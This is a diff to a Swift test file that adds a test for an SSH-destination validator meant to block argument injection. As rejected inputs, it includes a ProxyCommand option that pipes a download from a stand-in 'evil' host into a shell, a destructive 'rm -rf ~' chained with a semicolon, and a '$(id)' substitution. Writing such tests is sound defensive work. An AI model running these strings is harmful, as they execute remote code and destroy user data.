@@ -131,6 +131,26 @@ private func validConfig() -> ConduitProvisioner.Config {
     #expect(spaced.hasSuffix("&relay=wss://r%20x.com"))
 }
 
+// MARK: - SSH destination safety (argument-injection guard)
+
+@Test func sshDestination_rejectsOptionInjectionAndJunk_acceptsRealTargets() {
+    // The attack: a leading '-' makes ssh/scp read the "host" as a client OPTION
+    // (-oProxyCommand=…) and run an arbitrary local program.
+    #expect(!ConduitProvisioner.isSafeSSHDestination("-oProxyCommand=curl evil|sh"))
+    #expect(!ConduitProvisioner.isSafeSSHDestination("-J jump"))
+    #expect(!ConduitProvisioner.isSafeSSHDestination(""))
+    // Shell/space/metachar junk is refused (belt-and-suspenders; argv already bypasses
+    // the shell, but a whitelisted destination is unambiguous).
+    #expect(!ConduitProvisioner.isSafeSSHDestination("host; rm -rf ~"))
+    #expect(!ConduitProvisioner.isSafeSSHDestination("host name"))
+    #expect(!ConduitProvisioner.isSafeSSHDestination("host$(id)"))
+    // Real destinations pass.
+    #expect(ConduitProvisioner.isSafeSSHDestination("auston@mac.local"))
+    #expect(ConduitProvisioner.isSafeSSHDestination("192.168.1.20"))
+    #expect(ConduitProvisioner.isSafeSSHDestination("user@host.example.com:2222"))
+    #expect(ConduitProvisioner.isSafeSSHDestination("build-box"))
+}
+
 // MARK: - Runbook
 
 @Test func runbookCoversTheKeySteps() {
